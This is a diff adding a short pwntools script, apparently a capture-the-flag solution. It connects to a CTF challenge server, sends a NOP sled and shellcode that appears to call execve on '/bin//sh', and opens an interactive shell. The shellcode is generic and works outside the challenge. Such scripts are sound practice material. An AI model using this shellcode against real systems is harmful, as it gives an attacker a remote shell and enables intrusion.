@@ -1,0 +1,12 @@
+from pwn import *
+
+host, port = "ctf.adl.csie.ncu.edu.tw", 11004
+p = remote(host, port)
+print(p.recvline())
+
+p.sendline(b"\x87\xf2\xff\xcf\x0f\x05"+ b"\x90"*6 +
+	   b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c" + 
+	   b"\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52" +
+	   b"\x57\x54\x5e\xb0\x3b\x0f\x05")
+
+p.interactive()
